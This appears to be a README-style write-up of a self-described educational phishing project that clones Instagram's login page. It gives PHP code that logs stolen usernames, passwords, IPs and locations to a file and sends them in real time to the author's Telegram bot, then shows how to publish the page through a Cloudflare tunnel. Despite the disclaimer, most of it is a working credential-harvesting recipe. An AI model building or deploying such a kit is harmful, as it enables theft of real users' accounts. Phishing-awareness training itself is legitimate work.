--  =  What I Did in This Phishing Demo Project  = --


---

So this is a phishing page I made for learning purposes only, just to show how attackers can trick users into entering their login info.

I cloned the Instagram login UI using basic HTML and CSS (index.html) to make it look  real . When someone enters their username and password, the info gets captured using a PHP backend (login.php), and it does two things:


---

✅ 1. Saves the creds locally

In the same folder, you'll see a file called creds.txt. That’s where every login attempt gets logged, like:

Username: someuser
Password: somepass
IP: 192.168.x.x
Location: Kochi, IN

I used this PHP function to save it:

file_put_contents("creds.txt", "Username: $user\nPassword: $pass\n...", FILE_APPEND);


---

✅ 2. (Optional) Sends the creds instantly to my Telegram

So instead of checking the text file manually every time, I also set it up to send a Telegram alert the second someone logs in.

> To do this, I created a bot on Telegram using @BotFather and got my Bot Token and Chat ID.



Then I edited this part of the login.php file:

$bot_token = "YOUR_BOT_TOKEN_HERE";
$chat_id = "YOUR_CHAT_ID_HERE";

$message = "🎯 *New Phish Hit:*\n👤 `$user`\n🔑 `$pass`\n🌐 `$ip - $location`\n📱 `$agent`";

$url = "https://api.telegram.org/bot$bot_token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

file_get_contents($url . "?" . http_build_query($data));

So basically now I get a DM on Telegram with the full login info, location, and browser used — works clean, real-time.


---

🌍 Hosting the Page (for demo):

I used PHP’s built-in server to run the page:

php -S 127.0.0.1:8080

Then I exposed it to the internet using Cloudflared :

cloudflared tunnel --url http://127.0.0.1:8080

This gives a public link like:

https://randomname.cloudflared.link

Which I can open in any browser or even on my phone.


---

💡 What this project shows:

How phishing pages look exactly like the real ones

How data can be captured silently in the background

That attackers can get instant alerts (Telegram bot)

How important user awareness + 2FA is



---

🛑 Reminder:

This was only done in a controlled environment. No real accounts or users were harmed — it's just a security simulation to learn how phishing works so I can understand and defend against it.


---
-------BY- Athul :) 
